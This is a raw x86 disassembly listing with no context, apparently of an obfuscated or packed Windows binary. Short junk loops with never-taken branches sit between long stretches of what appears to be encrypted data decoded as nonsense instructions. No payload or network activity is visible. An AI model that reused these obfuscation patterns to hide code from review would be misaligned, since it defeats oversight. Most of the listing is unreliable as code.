  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0xe50e7504
  406bfe:	and    DWORD PTR [eax+0x65],eax
  406c01:	cmp    bh,BYTE PTR [esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c6e
  406c09:	xchg   edi,eax
  406c0a:	shl    DWORD PTR [ebp-0x33],0x51
  406c0e:	dec    edi
  406c0f:	out    dx,eax
  406c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c11:	add    al,0xe8
  406c13:	test   al,0xdc
  406c15:	push   esi
  406c16:	add    BYTE PTR [edx+0x30bfdd5],bl
  406c1c:	mov    fs,esp
  406c1e:	xchg   al,bh
  406c20:	adc    cl,BYTE PTR [edx]
  406c22:	sub    BYTE PTR [eax],cl
  406c24:	les    ebx,FWORD PTR [ebx+0x7c]
  406c27:	and    eax,0x5286320c
  406c2c:	sub    eax,0xa91c7252
  406c31:	sbb    al,0x4d
  406c33:	dec    ecx
  406c34:	leave  
  406c35:	cmp    DWORD PTR [ebx-0x189eeec4],0x4637f24e
  406c3f:	cmc    
  406c40:	pop    ss
  406c41:	fwait
  406c42:	sbb    al,0x19
  406c44:	lock jl 0x406c71
  406c47:	bound  esi,QWORD PTR [ecx]
  406c49:	je     0x406c3c
  406c4b:	cmp    DWORD PTR [ebx],0x48b5bae8
  406c51:	loop   0x406c27
  406c53:	retf   0xa3ed
  406c56:	fsubr  QWORD PTR [edi-0x64]
  406c59:	push   ss
  406c5a:	(bad)  
  406c5b:	in     al,0x7d
  406c5d:	cs inc esi
  406c5f:	int    0x83
  406c61:	push   edi
  406c62:	jecxz  0x406cdf
  406c64:	into   
  406c65:	aas    
  406c66:	daa    
  406c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c68:	pushf  
  406c69:	xchg   edi,eax
  406c6a:	sub    eax,0xa4878e1f
  406c6f:	retf   
  406c70:	mov    ecx,0x29e5280b
  406c75:	xor    cl,BYTE PTR [eax-0x1de9f48]
  406c7b:	cmp    al,0xaa
  406c7d:	add    esp,DWORD PTR [esi]
  406c7f:	sub    BYTE PTR [edi],0xe5
  406c82:	clc    
  406c83:	sub    BYTE PTR [ebp+0x17],dl
  406c86:	push   0x407c8071
  406c8b:	jo     0x406c39
  406c8d:	and    eax,DWORD PTR [eax-0x4c]
  406c90:	(bad)  
  406c91:	jl     0x406c19
  406c93:	fistp  DWORD PTR [esi-0x7b06d09b]
  406c99:	push   ebx
  406c9a:	neg    DWORD PTR [ecx+ecx*2+0x3cd4f812]
  406ca1:	xor    BYTE PTR [ebx],ah
  406ca3:	and    ebp,esp
  406ca5:	scas   al,BYTE PTR es:[edi]
  406ca6:	pop    esi
  406ca7:	dec    edi
  406ca8:	mov    ds:0xcc76fa15,eax
  406cad:	cmc    
  406cae:	test   eax,0x138300c1
  406cb3:	femms  
  406cb5:	add    ebx,DWORD PTR [esp+esi*4]
  406cb8:	inc    edi
  406cb9:	(bad)  
  406cba:	and    BYTE PTR ds:0x16198df2,bh
  406cc0:	mov    eax,fs:0x806ca0c9
  406cc6:	sti    
  406cc7:	out    dx,al
  406cc8:	retf   
  406cc9:	and    esp,DWORD PTR [ecx-0x75]
  406ccc:	out    dx,eax
  406ccd:	mov    ds:0x57f86121,eax
  406cd2:	out    dx,al
  406cd3:	imul   esp,DWORD PTR [ebx],0x88977e5e
  406cd9:	and    BYTE PTR [ebp+edx*4-0x129746a2],ch
  406ce0:	dec    eax
  406ce1:	pop    edi
  406ce2:	push   esp
  406ce3:	sub    al,0xf3
  406ce5:	cmp    esp,ebp
  406ce7:	inc    ebx
  406ce8:	pop    esp
  406ce9:	jg     0x406c8b
  406ceb:	mov    ah,0x63
  406ced:	iret   
  406cee:	cmp    esi,esi
  406cf0:	loopne 0x406d4d
  406cf2:	ret    
  406cf3:	pop    ecx
  406cf4:	cli    
  406cf5:	sti    
  406cf6:	in     eax,dx
  406cf7:	jns    0x406ca9
  406cf9:	int    0xe6
  406cfb:	outs   dx,BYTE PTR ds:[esi]
  406cfc:	popf   
  406cfd:	ficomp WORD PTR [ebx+0x758bcf9b]
  406d03:	jno    0x406d36
  406d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d06:	dec    ecx
  406d07:	sbb    BYTE PTR [edi],ch
  406d09:	xchg   edx,eax
  406d0a:	or     ch,BYTE PTR [edx-0x47]
  406d0d:	(bad)  
  406d0e:	mov    dl,0x87
  406d10:	or     edi,edx
  406d12:	xor    DWORD PTR [ebp+eax*4-0x10d5e0a9],edx
  406d19:	sbb    DWORD PTR [esi],edi
  406d1b:	das    
  406d1c:	mov    dl,0x2b
  406d1e:	dec    ecx
  406d1f:	inc    edx
  406d20:	imul   ecx,DWORD PTR [ecx],0x7f
  406d23:	mov    ch,0x88
  406d25:	outs   dx,BYTE PTR ds:[esi]
  406d26:	daa    
  406d27:	leave  
  406d28:	sub    al,0x2e
  406d2a:	jmp    0x406cf3
  406d2c:	cmp    eax,0x7645a2c0
  406d31:	adc    dh,BYTE PTR [ecx-0x54e5f654]
  406d37:	lahf   
  406d38:	cmp    al,0xbb
  406d3a:	add    BYTE PTR [edx-0x5bf3e033],0xa3
  406d41:	xchg   ebp,eax
  406d42:	fimul  WORD PTR [di]
  406d45:	test   DWORD PTR [eax+0x3c],eax
  406d48:	mov    esi,0xabe1f8d1
  406d4d:	jl     0x406dc4
  406d4f:	gs push ax
  406d52:	lock imul DWORD PTR [edx-0x990174a]
  406d59:	std    
  406d5a:	pop    ecx
  406d5b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  406d5d:	sub    cl,BYTE PTR [esi+0x2d33b032]
  406d63:	sbb    dh,BYTE PTR [ebx+ebp*2+0x5b8d4468]
  406d6a:	xchg   ecx,eax
  406d6b:	cmp    BYTE PTR [edx*2-0x70b9b908],bl
  406d72:	call   0x7046:0xdd6f0218
  406d79:	push   ss
  406d7a:	xchg   esi,eax
  406d7b:	cdq    
  406d7c:	jnp    0x406dde
  406d7e:	xor    eax,0xb3a32fca
  406d83:	inc    esp
  406d84:	xlat   BYTE PTR ds:[ebx]
  406d85:	mov    DWORD PTR [eax+0x36],0xc4aa60fb
  406d8c:	int    0x4e
  406d8e:	xchg   ebx,eax
  406d8f:	outs   dx,DWORD PTR ds:[esi]
  406d90:	data16 and BYTE PTR [ecx-0x22081441],dl
  406d97:	mov    ds:0x84613e72,eax
  406d9c:	add    edx,ecx
  406d9e:	and    DWORD PTR ds:0x43035f,0x0
  406da8:	mov    edi,DWORD PTR ds:0x43035f
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x43035f,edi
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x49477b7b],si
  406e0c:	cs jmp 0x8a7e:0x7e38f18c
  406e14:	jg     0x406e94
  406e16:	jle    0x406e5e
  406e18:	jo     0x406dea
  406e1a:	cdq    
  406e1b:	mov    DWORD PTR [ecx-0x43],edi
  406e1e:	xor    bl,BYTE PTR [edi]
  406e20:	sub    DWORD PTR [esp+esi*4+0x9],ebp
  406e24:	inc    edx
  406e25:	test   eax,0x122d0dad
  406e2a:	push   esi
  406e2b:	dec    ebp
  406e2c:	shr    dh,1
  406e2e:	stc    
  406e2f:	cmp    BYTE PTR [ebp+0x5b710724],al
  406e35:	jl     0x406dff
  406e37:	retf   0x59ad
  406e3a:	sbb    ch,BYTE PTR [edi]
  406e3c:	mov    eax,ss:0xeeb0712d
  406e42:	dec    edx
  406e43:	mov    eax,0xd2cb41bf
  406e48:	mov    gs,edi
  406e4a:	(bad)  
  406e4c:	repnz cmc 
  406e4e:	push   ebp
  406e4f:	popf   
  406e50:	fld    DWORD PTR [ecx+0x211ec4a2]
  406e56:	mov    eax,0x1542ece5
  406e5b:	sub    eax,0x87b68d72
  406e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e61:	mov    esp,ebx
  406e63:	or     cl,0xfe
  406e66:	mov    edi,0x249338d8
  406e6b:	cmp    al,0x24
  406e6d:	nop
  406e6e:	dec    ebp
  406e6f:	jecxz  0x406eda
  406e71:	ret    
  406e72:	or     eax,0x50e03ae
  406e77:	push   esp
  406e78:	push   edi
  406e79:	mov    cl,0x75
  406e7b:	pushf  
  406e7c:	sbb    BYTE PTR [edi-0x6a],bl
  406e7f:	add    BYTE PTR [ebp+0x52],dh
  406e82:	mov    ebx,0x9f248db3
  406e87:	sahf   
  406e88:	test   DWORD PTR [eax+0x27251adc],esi
  406e8e:	cwde   
  406e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e90:	mov    ah,0x59
  406e92:	lock popf 
  406e94:	inc    edx
  406e95:	jb     0x406eee
  406e97:	fsub   DWORD PTR [eax-0x20]
  406e9a:	(bad)  
  406e9c:	stos   DWORD PTR es:[edi],eax
  406e9d:	jbe    0x406e7b
  406e9f:	sbb    DWORD PTR [eax],0x70ed22cd
  406ea5:	jle    0x406e88
  406ea7:	mov    ss,ecx
  406ea9:	or     DWORD PTR [ecx+0x42],eax
  406eac:	leave  
  406ead:	xor    BYTE PTR [ecx+0x67a185e5],dh
  406eb3:	adc    DWORD PTR [esi+0x37],edi
  406eb6:	das    
  406eb7:	adc    DWORD PTR [edi+0x55],edx
  406eba:	cmp    eax,0xdda749e
  406ebf:	call   0x92097c1f
  406ec4:	or     DWORD PTR [esi+0x5ce29877],ebp
  406eca:	sub    eax,0xbcdf2370
  406ecf:	xchg   edx,eax
  406ed0:	push   cs
  406ed1:	sbb    al,0xe7
  406ed3:	test   BYTE PTR [edx-0x57aa0f35],0x28
  406eda:	mov    ds:0x15da2453,eax
  406edf:	ror    DWORD PTR [esi+0x1940e7c0],0x59
  406ee6:	jmp    0x724d65c7
  406eeb:	outs   dx,BYTE PTR ds:[esi]
  406eec:	dec    edi
  406eed:	ret    
  406eee:	sti    
  406eef:	adc    BYTE PTR [edi+0xc],al
  406ef2:	adc    ch,al
  406ef4:	xchg   edi,eax
  406ef5:	mov    ecx,0x18a8ae4
  406efa:	retf   
  406efb:	pop    esp
  406efc:	jg     0x406f14
  406efe:	sub    al,0xc2
  406f00:	hlt    
  406f01:	jmp    0xbd39:0x1798c40d
  406f08:	loop   0x406f83
  406f0a:	mov    ebp,0x7b0548ac
  406f0f:	sub    edi,DWORD PTR [esi+0x1a05f0e7]
  406f15:	mov    ss,WORD PTR [edi+esi*4+0x1c]
  406f19:	xchg   edx,eax
  406f1a:	lods   eax,DWORD PTR ds:[esi]
  406f1b:	cli    
  406f1c:	inc    eax
  406f1d:	fisttp QWORD PTR [esi]
  406f1f:	push   ds
  406f20:	push   0x6cb4ddf2
  406f25:	inc    edi
  406f26:	xor    al,BYTE PTR [eax]
  406f28:	sahf   
  406f29:	lock xor eax,0x7cba67ca
  406f2f:	imul   esp,DWORD PTR [esp+eax*8],0xffffff99
  406f33:	imul   BYTE PTR [edx]
  406f35:	cdq    
  406f36:	and    eax,0x1e9beb28
  406f3b:	jbe    0x406f68
  406f3d:	inc    edx
  406f3e:	mov    ah,0xa1
  406f40:	push   ecx
  406f41:	aas    
  406f42:	mov    ecx,0x9ca96418
  406f47:	retf   
  406f48:	cmp    dh,BYTE PTR [esi-0x66]
  406f4b:	xchg   ebx,eax
  406f4c:	test   BYTE PTR [edx-0x619bf58b],ah
  406f52:	sbb    al,0xea
  406f54:	jle    0x406fd1
  406f56:	cs gs dec ecx
  406f59:	pop    esi
  406f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f5b:	cmp    WORD PTR [ebx-0x68799b6],ax
  406f62:	dec    edx
  406f63:	mov    ch,0xa5
  406f65:	xchg   bh,bl
  406f67:	stos   DWORD PTR es:[edi],eax
  406f68:	in     eax,0x34
  406f6a:	xor    al,cl
  406f6c:	jne    0x406f68
  406f6e:	push   esp
  406f6f:	adc    eax,0x683b7962
  406f74:	jne    0x406fab
  406f76:	or     DWORD PTR [ebx+0x45b1d5bd],ecx
  406f7c:	call   0x34b:0x7b603c35
  406f83:	inc    edi
  406f84:	dec    edi
  406f85:	xlat   BYTE PTR ds:[ebx]
  406f86:	fs push edx
  406f88:	add    al,0xdf
  406f8a:	fwait
  406f8b:	pop    edx
  406f8c:	daa    
  406f8d:	(bad)  
  406f8e:	dec    esi
  406f8f:	dec    ecx
  406f90:	and    BYTE PTR [ecx],cl
  406f92:	xchg   ecx,eax
  406f93:	arpl   WORD PTR [ecx],sp
  406f95:	ds add bh,dh
  406f98:	mov    cl,0x25
  406f9a:	repnz fcom st(7)
  406f9d:	(bad)  
  406f9e:	scas   al,BYTE PTR es:[edi]
  406f9f:	push   eax
  406fa0:	or     DWORD PTR [edi-0x59999ff6],ebp
  406fa6:	mov    ds:0xb06299e0,eax
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x311a3d82,edx
  406fd4:	cli    
  406fd5:	mov    al,ds:0x7e7ec60d
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x406f6b
  406fdf:	push   ds
  406fe0:	jge    0x406f6b
  406fe2:	or     ch,al
  406fe4:	add    BYTE PTR ds:0xefbb3e5c,cl
  406fea:	out    0x87,eax
  406fec:	jg     0x40706c
  406fee:	xchg   esi,eax
  406fef:	adc    ah,0x25
  406ff2:	in     al,dx
  406ff3:	inc    edi
  406ff4:	jno    0x406fc5
  406ff6:	dec    esp
  406ff7:	cmc    
  406ff8:	lock int 0xf3
  406ffb:	xchg   edi,eax
  406ffc:	fisubr DWORD PTR [ebx]
  406ffe:	push   edx
  406fff:	inc    eax
  407000:	pop    edx
  407001:	and    al,0xe
  407003:	cmp    al,0xdb
  407005:	aad    0xda
  407007:	dec    eax
  407008:	fisttp QWORD PTR [edi-0x30129921]
  40700e:	sbb    BYTE PTR [esi+0x3cfbbd7a],ch
  407014:	or     al,0x1c
  407016:	dec    esp
  407017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407018:	inc    BYTE PTR [eax+edi*1]
  40701b:	lds    esp,FWORD PTR [esi]
  40701d:	mov    ah,0xd5
  40701f:	(bad)  
  407020:	es jnp 0x407079
  407023:	mov    cl,0x3c
  407025:	loop   0x406fb7
  407027:	xchg   edi,eax
  407028:	jbe    0x407025
  40702a:	int    0xd3
  40702c:	cmp    al,0xdd
  40702e:	(bad)  
  40702f:	mov    dh,0x55
  407031:	test   eax,0x9ad2d96a
  407036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407037:	aaa    
  407038:	xchg   DWORD PTR [ebx+eiz*2-0x145f031f],eax
  40703f:	fisubr WORD PTR [edx-0x470a6af6]
  407045:	jl     0x406ff6
  407047:	or     BYTE PTR [ecx+ecx*1+0x2da99b43],bl
  40704e:	cmp    DWORD PTR [esi],ebp
  407050:	ret    
  407051:	cmc    
  407052:	pop    ecx
  407053:	shl    BYTE PTR [ebp+0x17b38131],0xee
  40705a:	loop   0x4070c4
  40705c:	inc    edx
  40705d:	xor    BYTE PTR [esp+ebx*8],dh
  407060:	add    eax,0xb3656e88
  407065:	rcr    BYTE PTR [eax-0x6fd540b9],1
  40706b:	cld    
  40706c:	idiv   DWORD PTR [eax]
  40706e:	imul   edx,DWORD PTR [ebx+0x431818b7],0x9d7afff5
  407078:	push   edx
  407079:	jnp    0x40706d
  40707b:	adc    DWORD PTR [esi-0x69ef8aa1],ebx
  407081:	loopne 0x40702c
  407083:	cmp    ebp,DWORD PTR [edx-0x1211e52a]
  407089:	jecxz  0x40709d
  40708b:	cmp    BYTE PTR [edx-0x3b],0xeb
  40708f:	les    esi,FWORD PTR [edx-0x76]
  407092:	je     0x407024
  407094:	mov    al,0xce
  407096:	loopne 0x4070cc
  407098:	dec    ebp
  407099:	(bad)  
  40709a:	cmc    
  40709b:	cmp    dl,dh
  40709d:	lea    eax,[edi-0x51]
  4070a0:	(bad)  
  4070a1:	std    
  4070a2:	(bad)  
  4070a3:	cmp    bh,dh
  4070a5:	add    DWORD PTR [eax-0x45],ebx
  4070a8:	cmc    
  4070a9:	pop    es
  4070aa:	repz dec edi
  4070ac:	sbb    BYTE PTR [ebp+0x7],cl
  4070af:	xchg   ebp,eax
  4070b0:	(bad)  
  4070b1:	clc    
  4070b2:	sbb    dl,BYTE PTR [ecx+0x669b0e1b]
  4070b8:	xlat   BYTE PTR ds:[ebx]
  4070b9:	nop
  4070ba:	lods   al,BYTE PTR ds:[esi]
  4070bb:	repnz add ebx,esp
  4070be:	jns    0x407081
  4070c0:	pop    ebp
  4070c1:	xor    DWORD PTR [eax],edi
  4070c3:	inc    ebx
  4070c4:	fcom   QWORD PTR es:[ebx]
  4070c7:	into   
  4070c8:	clc    
  4070c9:	setg   al
  4070cc:	popa   
  4070cd:	ins    DWORD PTR es:[edi],dx
  4070ce:	pushf  
  4070cf:	loop   0x4070fc
  4070d1:	xchg   ebx,eax
  4070d2:	or     ch,BYTE PTR [esi+eax*1+0x5]
  4070d6:	addr16 (bad) 
  4070d8:	xlat   BYTE PTR ds:[ebx]
  4070d9:	push   ebx
  4070da:	jl     0x4070ab
  4070dc:	cmp    BYTE PTR [eax+eiz*8+0x52],cl
  4070e0:	jb     0x407151
  4070e2:	(bad)  
  4070e3:	sti    
  4070e4:	lds    esp,FWORD PTR [edx+0x1a2d114f]
  4070ea:	xor    DWORD PTR [ecx-0x18ecf2f4],ebx
  4070f0:	sub    al,0xf1
  4070f2:	mov    esi,eax
  4070f4:	int    0x11
  4070f6:	push   cs
  4070f7:	lods   al,BYTE PTR ds:[esi]
  4070f8:	rcr    DWORD PTR [esi+0x2e5dd36f],cl
  4070fe:	xchg   ebx,eax
  4070ff:	push   esi
  407100:	into   
  407101:	jmp    0x445f811f
  407106:	push   es
  407107:	sub    esi,DWORD PTR [ebx+0x34]
  40710a:	dec    edx
  40710b:	sub    esp,edx
  40710d:	lea    ebp,ds:0xa8a0ee6c
  407113:	lea    eax,[ebx]
  407115:	or     al,BYTE PTR [eax-0x7000649c]
  40711b:	dec    ebx
  40711c:	fild   QWORD PTR [esi]
  40711e:	(bad)  
  40711f:	clc    
  407120:	int3   
  407121:	add    ecx,DWORD PTR [ebp-0x7361216c]
  407127:	adc    BYTE PTR ds:0x2d00401b,0x8
  40712e:	(bad)  
  40712f:	fisttp QWORD PTR [ecx]
  407131:	cmp    BYTE PTR [edx+0x46],ah
  407134:	mov    dl,0x26
  407136:	retf   0x9803
  407139:	es mov ch,0x59
  40713c:	test   al,0xf
  40713e:	in     al,dx
  40713f:	or     eax,0x75daf25d
  407144:	ins    BYTE PTR es:[edi],dx
  407145:	repz add ah,BYTE PTR [edx]
  407148:	inc    edi
  407149:	jecxz  0x40710b
  40714b:	jmp    0x76b6:0xa8f48d7c
  407152:	jnp    0x40719a
  407154:	das    
  407155:	jg     0x407103
  407157:	arpl   WORD PTR [edi],dx
  407159:	xor    dx,sp
  40715c:	adc    BYTE PTR [ebx+0x40e0e5c4],bl
  407162:	dec    ebp
  407163:	adc    al,BYTE PTR [eax-0x40]
  407166:	repnz mov ah,0xc6
  407169:	add    DWORD PTR [eax-0xdbbda9f],0xffffffde
  407170:	inc    edi
  407171:	xlat   BYTE PTR ds:[ebx]
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e640,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x3a033f15
  4072a7:	fild   QWORD PTR [ebp-0x67]
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407313
  4072b2:	xchg   BYTE PTR [ebx+0x4b],dh
  4072b5:	dec    ebx
  4072b6:	cmc    
  4072b7:	mov    eax,0xc413fa98
  4072bc:	test   al,0x72
  4072be:	into   
  4072bf:	and    dh,bh
  4072c1:	inc    ebx
  4072c2:	aas    
  4072c3:	jecxz  0x4072fa
  4072c5:	mov    edx,0x1e11d0b5
  4072ca:	in     al,0xf1
  4072cc:	ret    0xc2ea
  4072cf:	mov    esi,0x821232a2
  4072d4:	xor    BYTE PTR [ebx],ah
  4072d6:	pop    edi
  4072d7:	jle    0x4072fe
  4072d9:	jmp    0x2a9327e2
  4072de:	inc    edi
  4072df:	mov    bh,0xa1
  4072e1:	xchg   esi,eax
  4072e2:	aaa    
  4072e3:	mov    ebp,0x57b69157
  4072e8:	mov    al,0xf1
  4072ea:	pop    esp
  4072eb:	mov    ebx,0x4aadf708
  4072f0:	fwait
  4072f1:	std    
  4072f2:	lods   al,BYTE PTR ds:[esi]
  4072f3:	test   esp,edx
  4072f5:	mov    bh,cl
  4072f7:	out    dx,ax
  4072f9:	int    0xed
  4072fb:	mov    es,WORD PTR [edx+0x2a3e5b0c]
  407301:	sub    BYTE PTR [ebx+0xe],bh
  407304:	addr16 inc edi
  407306:	mov    WORD PTR [eax-0x3a],ss
  407309:	xchg   edx,eax
  40730a:	rcl    BYTE PTR [ecx],1
  40730c:	lock xchg ecx,eax
  40730e:	mov    ebx,0xda82f898
  407313:	and    eax,0x663986d8
  407318:	enter  0xfa2,0x5
  40731c:	cmp    eax,0x7ddb06dc
  407321:	into   
  407322:	or     eax,esi
  407324:	fbld   TBYTE PTR [edi+edx*4-0x3ca5ce71]
  40732b:	jle    0x40738e
  40732d:	xchg   ecx,eax
  40732e:	cmc    
  40732f:	fst    DWORD PTR [ebp-0x2d]
  407332:	dec    ebx
  407333:	repnz into 
  407335:	fsubr  DWORD PTR [eax]
  407337:	mov    BYTE PTR [edi],0xb6
  40733a:	shl    DWORD PTR [esi],cl
  40733c:	add    al,ch
  40733e:	pop    ecx
  40733f:	leave  
  407340:	sbb    eax,0x28f75d5b
  407345:	repnz cmp eax,0xea7e1dc
  40734b:	(bad)  
  40734c:	xchg   edx,eax
  40734d:	je     0x407380
  40734f:	add    eax,0xb504d6f5
  407354:	mov    bh,BYTE PTR [esi+0x4d7a8676]
  40735a:	test   DWORD PTR [esi+0x67],0x12cbbba1
  407361:	into   
  407362:	mov    bh,0x58
  407364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407365:	dec    esi
  407366:	cmp    dh,BYTE PTR [ebx+eiz*2]
  407369:	out    dx,al
  40736a:	sbb    DWORD PTR [eax-0x4a5c11f7],esi
  407370:	lahf   
  407371:	pop    ebx
  407372:	jo     0x4073e8
  407374:	sbb    ecx,esi
  407376:	daa    
  407377:	push   ds
  407378:	pop    ebp
  407379:	fisub  WORD PTR [edx+eax*1+0x3915b308]
  407380:	inc    ebp
  407381:	jp     0x4073cd
  407383:	dec    ebx
  407384:	mov    eax,ds:0xa95520cc
  407389:	adc    DWORD PTR [ecx],ecx
  40738b:	idiv   bh
  40738d:	int3   
  40738e:	sar    ebx,cl
  407390:	sbb    ch,BYTE PTR [edi+0x28]
  407393:	pusha  
  407394:	(bad)  
  407395:	retf   0x4cd7
  407398:	cmp    eax,0xa294b5c1
  40739d:	push   ss
  40739e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40739f:	inc    eax
  4073a0:	cs jmp 0x22416d5d
  4073a6:	pop    ebx
  4073a7:	mov    al,0xc4
  4073a9:	cmp    DWORD PTR [ecx-0x2d],esp
  4073ac:	in     al,0x41
  4073ae:	shr    dh,cl
  4073b0:	stos   BYTE PTR es:[edi],al
  4073b1:	xor    WORD PTR [edi],sp
  4073b4:	int3   
  4073b5:	mov    ah,0x34
  4073b7:	mov    DWORD PTR [eax-0x76],0x476b02e3
  4073be:	rol    DWORD PTR [edx*4+0x3ffa011b],0x34
  4073c6:	dec    esi
  4073c7:	in     al,0xb4
  4073c9:	mov    ebp,DWORD PTR [ebx+0x6d]
  4073cc:	(bad)
  4073d0:	ins    DWORD PTR es:[edi],dx
  4073d1:	inc    edi
  4073d2:	push   edi
  4073d3:	cmc    
  4073d4:	fnstsw ax
  4073d6:	in     eax,0x25
  4073d8:	jo     0x407453
  4073da:	bound  eax,QWORD PTR [ecx+0x35]
  4073dd:	out    dx,al
  4073de:	imul   ecx,DWORD PTR [edi-0x201408ac],0x696949a8
  4073e8:	clc    
  4073e9:	pop    esi
  4073ea:	sahf   
  4073eb:	cmp    al,BYTE PTR [edx+0x6e]
